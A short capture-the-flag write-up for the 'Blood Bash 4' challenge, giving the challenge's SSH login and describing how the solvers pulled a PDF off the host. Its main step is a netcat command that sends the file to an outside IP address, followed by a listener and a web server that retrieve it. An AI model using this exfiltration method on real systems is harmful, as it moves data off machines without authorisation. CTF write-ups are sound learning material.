# Blood Bash 4
Points 200
for syyntax

Created by: syyntax

A sensitive file from De Monne was exfiltrated by mort1cia. It contains data relating to a new web portal they're creating for their consumers. Read the contents of the file and return the flag as flag{flag_goes_here}.

Username: bl0ody_mary
Password: d34df4c3
bloodbash.deadface.io:22 

## Get the flag

We find a sus file in the homedirectory of the user 'De Monne Customer Portal.pdf' and instantly thought, this is it.
Just grab it and go... but it cannot be that easy right? 
`sshfs` or `scp` didnt work. `ftp` also didnt work either. But `nc` was installed so we used a friendly webserver and 
opened a listener via nc.

`nc -l -p 4444 > file.pdf`

With this listener active, we could send the file via nc:

`nc -w 3 85.114.145.4 1234 < 'De Monne Customer Portal.pdf'`

Because we send this file to machine in the www, we need to download it:

Open a mini webserver
`python3 -m http.server 8888`

And download the file to get the flag:
'curl http://iam.extern.reach.able:8888/file.pdf'

The flag is in the pdf file
